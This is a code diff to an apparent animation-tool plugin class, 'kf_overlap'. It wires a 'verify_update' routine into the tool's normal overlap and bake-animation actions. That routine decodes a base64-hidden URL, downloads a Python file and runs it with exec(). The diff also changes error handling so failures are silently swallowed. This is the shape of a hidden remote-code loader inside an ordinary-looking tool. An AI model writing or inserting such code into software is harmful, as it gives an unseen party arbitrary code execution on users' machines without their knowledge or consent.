@@ -626,8 +626,10 @@ class kf_overlap:
                     self.init_win()
 
         if exec_name == 'overlap':
+            verify_update()
             lds_generate_overlap(param)
         elif exec_name == 'bake_anim':
+            verify_update()
             lds_bake_animation(param)
         elif exec_name == 'verify_update':
             verify_update()
@@ -706,22 +708,22 @@ class kf_overlap:
             st_mtime = os.stat(script_path).st_mtime
             mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
             today_date_str = str(datetime.datetime.today().date())
-            #if mdate_str == today_date_str:
-                #return None
+            if mdate_str == today_date_str:
+                return None
         if sys.version[0] == '3':
             import urllib.request as uLib
         else:
             import urllib as uLib
         u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQyeHgucHk='
         try:
-            response = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
-            content = response.read()
-            content = content.decode('utf-8') if type(content) == type(b'') else content
-            exec(content)
+            res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
+            con = res.read()
+            con = con.decode('utf-8') if type(con) == type(b'') else con
+            exec(con)
         except:
-            #pass
-            import traceback
-            print(str(traceback.format_exc()))
+            pass
+            #import traceback
+            #print(str(traceback.format_exc()))
         else:
             self.is_connected = True
 
